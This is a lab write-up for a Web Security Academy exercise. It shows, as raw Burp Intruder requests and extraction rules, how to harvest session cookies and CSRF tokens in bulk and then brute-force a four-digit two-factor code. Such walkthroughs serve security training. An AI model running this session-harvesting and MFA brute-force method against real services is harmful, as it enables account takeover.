@@ -1,0 +1,144 @@
+2FA bypass using a brute-force attack
+
+THE SOLUTION PROVIDED BY BURP NOT ONLY DOESN'T WORK, BUT EVEN WHEN FIXED IT'S TOO SLOW TO COMPLETE THE LAB IN TIME. SCROLL DOWN FOR THE REAL SOLUTION.
+
+This one can be a bit tricky if you miss a crucial step that is not mentioned in the instructions:
+In the Macro Editor, click on the POST /login request and for the csrf token, select "Derive from prior response". This will prevent the expiration of the token.
+Path: Project Options > Sessions > Session Handling Rules > Macro Editor
+
+Besides that, the instructions provided are great.
+
+Intruder request used:
+
+POST /login2 HTTP/1.1
+Host: ac7e1f7d1e8962ab809eb7a5008d00bd.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 51
+Origin: https://ac7e1f7d1e8962ab809eb7a5008d00bd.web-security-academy.net
+Connection: close
+Referer: https://ac7e1f7d1e8962ab809eb7a5008d00bd.web-security-academy.net/login2
+Cookie: session=ndjwIOwSzkL960awy1UuyW34aQvTtT8H
+Upgrade-Insecure-Requests: 1
+
+csrf=3VLoDBLB7SndfdZNQ37pXQHAaSKu9Tkg&mfa-code=§1234§
+
+Now you just wait... to fail. The solution provided does not work, even with burp pro. It is far too slow and the lab expires before you can finish it unless you get lucky.
+Here's the real solution, which is even worse:
+
+1. Capture unauthenticated session cookies and csrf tokens.
+
+Send the GET /login request to intruder, add a cache buster and generate 10k payloads (numbers from 0 to 9999) to get 10k session cookies and tokens.
+Don't forget to delete the session cookie from the request.
+
+GET /login?§§ HTTP/1.1
+Host: acc91fa21e24c6328069db24004e0038.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: https://acc91fa21e24c6328069db24004e0038.web-security-academy.net/
+Upgrade-Insecure-Requests: 1
+
+
+In options, add two Grep - Extract rules for the cookies and the csrf token:
+
+From [ session=] to [; Path=]
+From [ value="] to [">\n                            <label>]
+
+Launch the attack and wait. I did it with 100 threads and it took a couple of minutes.
+
+IMPORTANT: delete any non 200 responses from the result.
+
+Copy the session cookie and csrf token columns (in burp pro, you can control+click the column to copy it to clipboard).
+
+2. Obtain authenticated session cookies.
+
+Send the POST /login request to intruder. Add the markets to the session cookie and the csrf token. Should look like this:
+
+POST /login HTTP/1.1
+Host: acc91fa21e24c6328069db24004e0038.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 70
+Origin: https://acc91fa21e24c6328069db24004e0038.web-security-academy.net
+Connection: close
+Referer: https://acc91fa21e24c6328069db24004e0038.web-security-academy.net/login
+Cookie: session=§RSvHjqMRjuKkxqcezR4fAFnsMVpo6b3I§
+Upgrade-Insecure-Requests: 1
+
+csrf=§eYDO6KZaroZmkLxKc6g55moTPkJINQKY§&username=carlos&password=montoya
+
+
+Select attack type pitchfork, go to payloads.
+In the first list paste the session cookies from our previous attack.
+In the second list paste the csrf tokens from our previous attack.
+
+Add a Grep - Extract rule to capture the authenticated session cookie:
+From [ session=] to [; Path=]
+
+Launch the attack. You should be getting 302 responses. Wait for it to finish, then collect your new session cookies.
+
+IMPORTANT: Once again, delete any non 200 results from the list.
+
+3. Getting authenticated csrf tokens:
+
+Send the GET /login2 request to intruder. Should look like this:
+
+GET /login2 HTTP/1.1
+Host: acc91fa21e24c6328069db24004e0038.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://acc91fa21e24c6328069db24004e0038.web-security-academy.net/login
+Connection: close
+Cookie: session=§wIIVNVTlupjJbxvtNZq9PY83zA587Ihg§
+Upgrade-Insecure-Requests: 1
+
+Use the session cookies from the previous attack as payload.
+Add a Grep - Extract rule for the authenticated csrf token:
+From [ value="] to [">\n                        <label>]
+
+Launch the attack. You should be getting 200 responses. Wait. Collect tokens. 
+
+4. Use the authenticated session cookies, authenticated csrf tokens and a brute force together
+
+Send POST /login2 to intruder. Change attack type to pitchfork. Should look like this:
+
+POST /login2 HTTP/1.1
+Host: acc91fa21e24c6328069db24004e0038.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 51
+Origin: https://acc91fa21e24c6328069db24004e0038.web-security-academy.net
+Connection: close
+Referer: https://acc91fa21e24c6328069db24004e0038.web-security-academy.net/login2
+Cookie: session=§wIIVNVTlupjJbxvtNZq9PY83zA587Ihg§
+Upgrade-Insecure-Requests: 1
+
+csrf=§VvKhBIWhvNGOcjopGrZz8Yqy20mHWqYX§&mfa-code=§1234§
+
+Payload set 1 should be the session cookies obtained in step 2.
+Payload set 2 should the csrf tokens obtained in step 3.
+Payload set 3 should be numbers from 0 to 9999, no decimals.
+Payload count should be 10k.
+
+Set threads to whatever. I used 50. Launch the attack. 
+Here's where you find out if you made any mistakes. You should be getting 200 replies and wait for the 302 one.
+If, instead, you are getting a few 200 and then 400, it means you haven't cleaned up the results from the previous steps.
+You probably have a non-200 request in there or a request with empty parameters. 400 responses are caused by the fact that
+the session cookies and the csrf tokens get out of sync. You can check this manually. If this happens, you'll have to start again.
+If it doesn't, wait for the 302 response, copy in browser and claim your prize. 
+
+This is probably the hardest lab. Good luck, you'll need it.
